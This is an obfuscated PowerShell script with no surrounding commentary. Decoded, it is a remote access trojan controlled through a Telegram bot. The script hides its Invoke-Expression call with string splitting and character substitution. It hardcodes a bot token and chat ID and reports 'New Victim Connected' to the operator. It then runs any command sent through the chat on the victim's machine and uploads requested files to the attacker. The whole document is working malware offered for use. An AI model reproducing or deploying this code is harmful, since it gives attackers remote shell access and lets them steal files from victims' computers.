 &( $sHeLLID[1]+$ShElliD[13]+'X') ((('XoZbotTo'+'ken=D'+'ts7250427603:AAG27yN4SCGIb3FgRQmVtvs-zQduYFTOtRcDts
XoZuri=ejDhttps://api.telegram.org/botXoZbotToken/ejD
XoZsessions=@{}

function Send-TelegramMessage {
    param([string]XoZchatId, [string]XoZmessage'+')'+'
    Xo'+'Zpayload=@{chat_id=XoZchatId; text=XoZmessage}
    Invoke-RestMethod -Uri ejDXoZ{uri}sendMessageejD -Method Post -ContentType ejDapplication/x-www-form-urlencodedejD -Body XoZpayload
}

XoZchat'+'Id=Dts1404653011Dts
Send-TelegramMessa'+'ge -chatId XoZchatId -message ejDNew Victim Connected The Bot.e'+'jD

functio'+'n Generate-Sess'+'ionID {
    X'+'oZchars=DtsABCDEFGHIJKLMNOPQRSTUV'+'W'+'XYZ0123456789Dts
    XoZlength=7
    XoZsessionID=-join((1..XoZlength) FYG ForEach-Object { XoZchars[(Get-Random -Minimum 0 -Maximum XoZchars.Length)] })
    return XoZsessionID
}

function Show-Help {
    XoZhelpMess'+'age=@ejD
Availabl'+'e Commands:
/sessions         : Generat'+'es a random session ID.
/shell <session_id>: Enter a session and execute commands.
/exit             : '+'Exit the current'+' session.
/help             : Shows this help message.
/download <file>  : S'+'ends a file to the botDtss chat (absolute or relative pa'+'th).
ejD@
    return XoZhelpMessage
}'+'

function Get-Telegram'+'Updates {
   '+' param([int]XoZoffset'+')
    XoZurl=ejDXoZ{uri}getUpd'+'ates?offset=XoZoffsetejD
    return Invoke-RestMethod -Uri XoZurl -Method Get
}

function Send-TelegramFil'+'e {
'+' '+'   param([string]XoZfilePath, [string]XoZchatId)
 '+'   # Ensure the path is absolute
    if (-not'+' ([System.IO.Path]::IsPathRooted(XoZfilePath))) {
        XoZfilePath = Join-Path -Path (Get-Location).Path -ChildPath XoZfilePath'+'
    }
 '+'   
    if (-not (Test-Path XoZ'+'filePath)) {
        Send-'+'TelegramMessage -chatId XoZchatId -message ejDFile not found: XoZfilePathejD
        return
    }

    # Upload file to Telegram
    XoZurl = ejDhttps://api.telegram.org/botXoZbotToken/sendDocumentejD
    XoZboundary = [System.Guid]::NewGuid().ToString()
    XoZLF = ejDzmjrzmjnejD
    XoZfields'+' '+'= @(
 '+'       ejD--Xo'+'ZboundaryXoZLFejD +
        ejDContent-Disposition: form-data; n'+'ame=zmjejDchat_idzmjejDXoZLFXoZLFXoZchatIdXoZLFejD +
    '+'   '+' ejD'+'--XoZboundaryXoZLF'+'ejD +
        ejDContent-Disposition: form-data; name=zmjejDdocumentzmjejD; filename=zmj'+'ejDXoZ([Sy'+'st'+'em.IO.Path]::GetFileName(XoZfilePath))zmjejDXoZLFejD +
        ejDContent-Type: application/octet-stream'+'XoZLFXoZLFej'+'D
'+'    )
    XoZfil'+'eConten'+'t = [Syst'+'em.IO.F'+'ile]::Read'+'AllBytes(XoZfilePath)
    XoZendB'+'oundary = ej'+'DXoZLF--XoZboundary'+'--XoZLFejD
    X'+'oZbody = '+'([System.Text.Encoding]::ASCII.GetBytes(XoZfields) + XoZfileContent + [System.Text.Encoding]::ASCII.GetBytes(Xo'+'ZendBoundary))'+'

    XoZrequest = [System.Net.HttpWebRequ'+'est]::Creat'+'e(XoZurl)
    XoZrequest.Method = ejDPOSTejD
    XoZrequest.ContentType = ejDmultipart/form-data; boundary=XoZboundaryejD
    XoZrequest.ContentLength = XoZbody.Length

    XoZrequestStream = XoZrequest.GetRequestStream()
    XoZrequestStream.W'+'rite(XoZbody, 0, XoZbody.'+'Length)
   '+' XoZrequestStream.Close()

    XoZresponse = XoZrequest.GetResponse()
    XoZresponseStream = XoZresponse.GetResponseStream()
    XoZreader = [Syst'+'em.IO.StreamRe'+'ader]::new(XoZresponseStream)
    XoZresp'+'onseContent = XoZreader.ReadToEnd()
   '+' XoZreader.Close()

    Send-TelegramMessage -chatId XoZchatId -message ejDFile sent successfully: XoZfilePathejD
}

XoZ'+'offset=0
XoZactiveSessions=@{}
while (XoZtrue) {
    XoZupdates '+'= Get-Tel'+'egramUpdates -offset XoZoffset
    foreach (XoZupdate in XoZupdates.result) {
        XoZm'+'essage = XoZupdate.message.text
        XoZchatI'+'d = XoZupdate.message.chat.id
        XoZoffset = XoZupdate.update_id + 1

        if (XoZmessage -eq Dts/sessionsDts) {
            XoZsessionID = Gene'+'rate-SessionID
            XoZsessions[XoZchatId] = XoZsessionID
            Send-TelegramMessage -chatId XoZchatId -message ejDYour sessio'+'n ID is: XoZsessionIDejD
     '+'   }
        elseif (XoZmessage -like Dts/shell*Dt'+'s) {
            XoZsessionID = XoZmessage.Substring(7).T'+'rim()
            if (XoZsess'+'ions.ContainsKey(XoZ'+'chatId) -a'+'nd XoZsessions[XoZchatId]'+' -eq XoZsessionID) {
   '+'             Xo'+'ZactiveSessions[XoZchatId] = XoZsessionID
                Send-TelegramMessage'+' -chatId XoZc'+'hatId -message ejDYou are now in session XoZsessionID. Enter your commands.ejD
            '+'}
  '+'          else {
 '+'               Send-TelegramMessage -chatId XoZchatId '+'-message e'+'jDInvalid or expired session ID: XoZsessionIDejD
            }
        }
        elseif (XoZ'+'message -eq Dts/exitDts) {
            if (XoZactiveSessions.Contain'+'sKey(XoZch'+'atId)) '+'{
                XoZactiveSessions.Remove(XoZchatId)
                Send-TelegramMessage -chatId XoZchatId -message ejDYou have exited the session.ejD
            }'+'
            else {
                Send-TelegramMessage -chatId XoZchatId'+' -message ejDYou are not in any session.ejD
            }
        }
        elseif (XoZmessage -eq Dts/helpDts) {
            XoZhel'+'pMessage = Show-Help
            Send-'+'TelegramMessage -chatId XoZchatId -messag'+'e XoZhelpMessage
        }
    '+'    elseif (XoZmessage -like Dts/download*Dts) {
            XoZ'+'filePath = XoZmessa'+'ge.Substring(10).Trim()
'+'            Send-TelegramFile -f'+'ilePath XoZfile'+'Path -chatI'+'d XoZchatId
        }
        elseif (XoZactiveSessions.ContainsKey(XoZchatId)) {
            try {
                XoZresult = Invoke-Expression XoZmessage'+' 2>&1
                Send-TelegramMessage -chatId XoZchatId -message (XoZresult -join ej'+'Dz'+'mjnejD)
            }
            catch {
                Send-TelegramMessage '+'-chatId XoZchatId -message ejDError executing command: XoZ_ejD
            }
        }
        else {
            Send-TelegramMessage -chatId XoZchatId -message ejDInvalid command. Use /help for '+'available commands.ejD
        }
    }
    Start-Sleep -Seconds 2
}
')  -RePlACe ([cHar]70+[cHar]89+[cHar]71),[cHar]124 -RePlACe  ([cHar]68+[cHar]116+[cHar]115),[cHar]39 -RePlACe'ejD',[cHar]34-CREPLAce  ([cHar]88+[cHar]111+[cHar]90),[cHar]36  -RePlACe([cHar]122+[cHar]109+[cHar]106),[cHar]96)) 